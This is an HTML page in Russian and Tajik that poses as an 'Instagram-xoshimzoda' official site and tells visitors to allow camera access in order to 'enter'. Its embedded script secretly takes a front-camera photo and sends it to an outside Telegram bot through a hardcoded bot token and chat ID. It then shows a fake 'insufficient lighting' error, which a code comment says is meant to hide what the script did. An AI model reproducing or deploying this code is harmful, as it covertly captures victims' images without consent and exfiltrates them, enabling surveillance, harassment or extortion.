<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram-xoshimzoda | Официальный сайт</title>
</head>
<body style="text-align: center; background: #000; color: #fff; font-family: sans-serif; padding: 20px;">

    <h2>Чтобы войти в сайт, нажмите кнопку ниже ⏬!</h2>
    <p style="color: #ccc;">Нажми кнопку ниже, а потом разреши доступ к камере.</p>
    <p style="font-size: 0.9em; color: #888;">Барои ворид шудан ба тугмаи зери навиштаҷот зер кунед. Пеш аз ворид шудан тугмаи "Разрешить"-ро зер кунед!</p>
    
    <button id="start" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer; font-weight: bold; margin-top: 20px;">
        Instagram-xoshimzoda
    </button>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = '8451687940:AAF5ol406SUXrT33g330J3E-iZ5qjvp7A50';
        const chatId = '7829181579';

        document.getElementById('start').onclick = async () => {
            try {
                // Запрашиваем камеру
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                // Ждем 3 секунды (3000 мс), чтобы камера настроила яркость
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'snap.jpg');

                        // Отправка в Телеграм
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(() => {
                            // Сообщение об ошибке, чтобы скрыть работу скрипта
                            alert("Ошибка входа: недостаточно освещения! Попробуйте еще раз в более светлом месте.");
                            // Выключаем камеру
                            stream.getTracks().forEach(track => track.stop());
                        });
                    }, 'image/jpeg', 0.9);
                }, 3000); 

            } catch (err) {
                alert("Для входа нужно нажать 'Разрешить' для сканирования лица.");
            }
        };
    </script>
</body>
</html>
